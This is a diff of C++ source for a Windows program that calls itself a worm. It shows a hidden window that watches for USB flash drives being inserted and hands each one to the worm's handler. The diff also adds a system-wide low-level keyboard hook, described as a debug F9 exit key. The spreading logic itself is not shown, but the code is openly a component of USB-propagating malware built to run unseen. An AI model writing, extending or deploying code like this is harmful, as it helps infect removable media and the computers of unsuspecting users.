@@ -2,6 +2,7 @@
 #include "worm.h"
 #include <windows.h>
 #include <set>
+
 std::wstring get_own_path() {
     wchar_t buffer[MAX_PATH];
     DWORD result = GetModuleFileNameW(NULL, buffer, MAX_PATH);
@@ -425,7 +426,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 for (int i = 0; i < 26; ++i) {
                     if (unitMask & (1 << i)) {
                         wchar_t drive = L'A' + i;
-                        std::wcout << L"[💡] Обнаружена флешка: " << drive << L":\\" << std::endl;
+                        std::wcout << L" Обнаружена флешка: " << drive << L":\\" << std::endl;
 
                         // Вызов метода для обработки флешек
                         if (worm::instance) {
@@ -461,12 +462,12 @@ int worm::run_device_monitor(HINSTANCE hInstance)
     }
 
     HWND hwnd = CreateWindowEx(
-        0,                              // расширенный стиль окна
-        CLASS_NAME,                     // имя класса
-        L"Worm Device Monitor",         // заголовок окна
-        WS_OVERLAPPEDWINDOW ,            // стиль окна
-        CW_USEDEFAULT, CW_USEDEFAULT,   // позиция окна
-        300, 200,                      // размер окна
+        0,
+        CLASS_NAME,
+        L"Worm Device Monitor",
+        WS_OVERLAPPEDWINDOW,
+        CW_USEDEFAULT, CW_USEDEFAULT,
+        300, 200,
         NULL, NULL, hInstance, NULL);
 
     if (!hwnd) {
@@ -476,6 +477,13 @@ int worm::run_device_monitor(HINSTANCE hInstance)
 
     ShowWindow(hwnd, SW_HIDE); // Скрываем окно
 
+    // Установка хука для F9
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, worm::LowLevelKeyboardProc, NULL, 0);
+    if (!keyboardHook) {
+        std::wcerr << L"Ошибка установки клавиатурного хука\n";
+        return -1;
+    }
+
     // Цикл сообщений
     MSG msg = {};
     while (GetMessage(&msg, NULL, 0, 0) > 0) {
@@ -483,14 +491,43 @@ int worm::run_device_monitor(HINSTANCE hInstance)
         DispatchMessage(&msg);
     }
 
+    // Очистка хука
+    if (keyboardHook) {
+        UnhookWindowsHookEx(keyboardHook);
+        keyboardHook = nullptr;
+    }
+
     return 0;
 }
 
+
 void attach_console() {
-    AllocConsole();
+    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
+        AllocConsole();
+    }
     FILE* fp;
+
     freopen_s(&fp, "CONOUT$", "w", stdout);
     freopen_s(&fp, "CONOUT$", "w", stderr);
     freopen_s(&fp, "CONIN$", "r", stdin);
-    std::ios::sync_with_stdio();
+}
+
+
+
+HHOOK worm::keyboardHook = nullptr; // Для считывания горячей клваиши по завершению мониторинга флешек (отладочный метод)
+
+LRESULT CALLBACK worm::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
+
+        // Проверка: F9
+        SHORT ctrl = GetAsyncKeyState(VK_CONTROL);
+        SHORT shift = GetAsyncKeyState(VK_SHIFT);
+
+        if (p->vkCode == VK_F9) {
+            std::wcout << L"[!] F9 нажата — Завершение работы\n";
+            PostQuitMessage(0);
+        }
+    }
+    return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
